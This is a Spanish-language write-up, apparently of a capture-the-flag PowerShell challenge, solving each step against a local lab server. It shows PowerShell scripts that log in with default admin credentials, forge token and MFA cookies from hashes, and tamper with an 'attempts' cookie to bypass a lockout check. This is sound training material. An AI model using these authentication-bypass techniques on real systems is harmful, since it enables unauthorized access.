# PowerShell

En este desafío se requiere el uso del intérprete PowerShell. Consiste en resolver una serie de desafíos a través de la consola para evadir una suerte de defensa por parte de los elfos y ganar nuevamente acceso a las operaciones del arsenal.

## **Primer desafío**
Se solicita que leamos el contenido del archivo `welcome.txt` ubicado en el directorio actual:

![[ps1.png]]

Para ello basta con utilizar el comando `Get-Content` que tiene PowerShell:

![[ps2.png]]

## **Segundo desafío**
Ahora debemos contar el número de palabras que existen en el archivo, entonces escribimos la ruta del archivo, utilizamos nuevamente el comando `Get-Content` y pipeamos el output a un segundo comando `Measure-Object` junto con la flag `–Word`:

```powershell
Get-Content ./welcome.txt | Measure-Object -Word
```

![[ps3_2.png]]

## **Tercer desafío**
Ahora nos dice que hay un servidor escuchando para nuevas conexiones, para ver todos los sockets en escucha se puede utilizar el comando `netstat` junto con 
la flag `l` o `--listening`:

![[ps4_2.png]]

## **Cuarto desafío**
Ahora debemos comunicarnos con el servidor y ver cuál es el status code que nos devuelve. Para ello existe el comando `Invoke-WebRequest`. Es necesario indicar la URI mediante la flag `-Uri`:

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225
```

![[ps5.png]]

El servidor responde con status code 401.

## **Quinto desafío**
Ahora nos dice que intentemos autenticarnos con credenciales estándar de usuario administrador, es decir, *user: admin*, *password: admin*. Esto lo podemos hacer ejecutando una serie de comandos:

```powershell
$user = 'admin'
$pass = 'admin'

$pair = "$($user):$($pass)"

$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))

$basicAuthValue = "Basic $encodedCreds"

$Headers = @{
    Authorization = $basicAuthValue
}

Invoke-WebRequest -Uri '127.0.0.1:1225' -Headers $Headers
```


![[ps6.png]]



## **Sexto desafío**
Ahora es necesario que descarguemos todos los contenidos de los endpoints utilizando un loop. En la propiedad "Links" que devuelve la request se encuentran todos los endpoints. Para ver todos los links podemos expandir la propiedad pipeando el resultado a `Select-Object -ExpandProperty links`:

```powershell
Invoke-WebRequest -Uri '127.0.0.1:1225' -Headers $Headers | Select-Object -ExpandProperty links
```

![[ps8.png]]

Aquí se puede ver que existen 50 endpoints, entonces podemos crear un loop para que realice 50 iteraciones, recuperando cada uno de los documentos y contando las palabras que hay en ellos:

```powershell
1..50 | ForEach-Object { Invoke-WebRequest 127.0.0.1:1225/endpoints/$_ -Headers $Headers | measure -word }
```

![[ps9.png]]

Como el contenido del output no entra en el emulador de terminal, tuve que hacer zoom out, y puede verse que el archivo con 138 palabras es el numero 13. Para obtener este archivo, puede ejecutarse los siguientes comandos:

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225/endpoints/13 -Headers $Headers -OutFile file13.txt
Get-Content file13.txt
```

![[ps10.png]]



## **Séptimo desafío**
El contenido del archivo `file13.txt` revela la existencia de un archivo con extensión `.csv`. Para ver su contenido podemos aplicar los mismos comandos que la vez anterior, cambiando simplemente la URI y el nombre del archivo de salida:

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225/token_overview.csv -Headers $Headers -OutFile token_overview.csv
Get-Content token_overview.csv
```

![[ps11.png]]



## **Octavo desafío**
Al parecer existe un endpoint que no está redactado. Basado en la respuesta del servidor, el endpoint se encuentra en `http://127.0.0.1:1225/tokens/<sha256sum>`, en donde `<sha256sum>` es un placeholder para un checksum SHA256. Aquí se puede colocar el checksum del endpoint no redactado: `4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`:

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers 
```

Intenté colocando el mismo valor SHA256 como cookie agregándolo a la variable de entorno `headers` que antes había creado, pero no funcionó, el servidor decía que faltaba una cookie 'token', entonces coloque la nueva cookie en los headers con el valor del hash SHA256:

```powershell
$Headers = @{
    Authorization = $basicAuthValue
	Cookie='token=4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C'
}
```

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers
``` 

![[ps14.png]]

En ese momento se me ocurrió intentar con el hash MD5 correspondiente al token, modificando nuevamente la variable `headers`:

```powershell
$Headers = @{
    Authorization = $basicAuthValue
    Cookie='token=5f8dd236f862f4507835b0e418907ffc'
}
```

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers
``` 



## **Noveno desafío**
El servidor respondió con un código MFA e indicó que debemos establecerlo dentro del valor de la cookie `mfa_code`, en la URI `http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`:

![[ps15.png]]

```powershell
$Headers = @{
    Authorization = $basicAuthValue
    Cookie = "token=5f8dd236f862f4507835b0e418907ffc"
    mfa_code = "1733844095.0384514"
}
```

```powershell
Invoke-WebRequest -Uri 127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers
```


## **Décimo desafío**
Ahora necesitamos validar el token en el endpoint:

```powershell
$Headers = @{
    Authorization = $basicAuthValue
    Cookie = "token=5f8dd236f862f4507835b0e418907ffc"
}

$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers).Links.href

$Headers = @{
    Authorization = $basicAuthValue
    Cookie = "token=5f8dd236f862f4507835b0e418907ffc; mfa_token=$mfa"
}

(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers).Content
```

El servidor responde con un **Base64**: 

```
Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==
```

Ahora resta decodificarlo, esto puede hacerse utilizando:

```powershell
$text = 'Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=='

$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($text))

Write-Output $decoded
```

![[ps17.png]]

Tal y como puede verse en la imagen, el output contiene la contraseña personal "*SnowLeopard2ReadyForAction*".

## **Hard Mode (Gold)**
Luego de completado, el elfo nos dice que es posible hacer un bypass de lo que hicimos anteriormente y escribir un script para completar el desafío. Además, nos da pistas acerca de cómo podemos lograrlo:

![[ps18.png]]

![[ps19.png]]

Lo primero que se me ocurrió fue iterar sobre las filas del archivo `token_overview.csv` que contiene los endpoints (en principio) redactados y crear un archivo que contenga el Hash MD5, luego pipear cada uno de los contenidos de los archivos a `Get-FileHash -Algorithm SHA256` para obtener todos los hashes. Una vez hecho esto, intentar verificar los endpoints contra la URI `http://127.0.0.1:1225/tokens/<sha256sum>`.

Luego defino el siguiente script:

```powershell
$csv = "token_overview.csv"

Import-Csv -Path $csv | ForEach-Object {
	$md5 = $_.file_MD5hash
	$temp = New-TemporaryFile
	$md5 | Out-File -FilePath $temp.FullName -Encoding ASCII
	$hash = (Get-FileHash -Path $temp.FullName -Algorithm SHA256).Hash.Trim()
	Remove-Item -Path $temp.FullName -Force

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5"
	}

	$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/$hash -Headers $Headers).Links.href

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5; mfa_token=$mfa"
	}

	(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/$hash -Headers $Headers).Content
}
```

Este script obtiene los valores MD5 de cada fila del archivo `token_overview.csv`, los guarda en un archivo con el mismo nombre que el hash, luego obtiene el hash SHA256 de cada uno de ellos y los envía hacia `http://127.0.0.1:1225/mfa_validate/<sha256sum>` para su verificación.

Luego de ejecutado el script, obtuve:

![[ps21.png]]

Al parecer se está seteando una cookie "attempts", lo que se condice con lo que el elfo había dicho sobre el protocolo _EDR_. Entonces volví a ejecutar los mismos comandos que usé previamente, pero esta vez agregando la cookie "attempts" con un valor inicialmente de 50 para probar.

```powershell
$csv = "token_overview.csv"

Import-Csv -Path $csv | ForEach-Object {
	$md5 = $_.file_MD5hash
	$temp = New-TemporaryFile
	$md5 | Out-File -FilePath $temp.FullName -Encoding ASCII
	$hash = (Get-FileHash -Path $temp.FullName -Algorithm SHA256).Hash.Trim()
	Remove-Item -Path $temp.FullName -Force

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5"
	}

	$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/$hash -Headers $Headers).Links.href

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5; mfa_token=$mfa; attempts=50"
	}

	(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/$hash -Headers $Headers).Content
}
```

El output fue exitoso:

![[ps22.png]]

Aqui termina el desafío.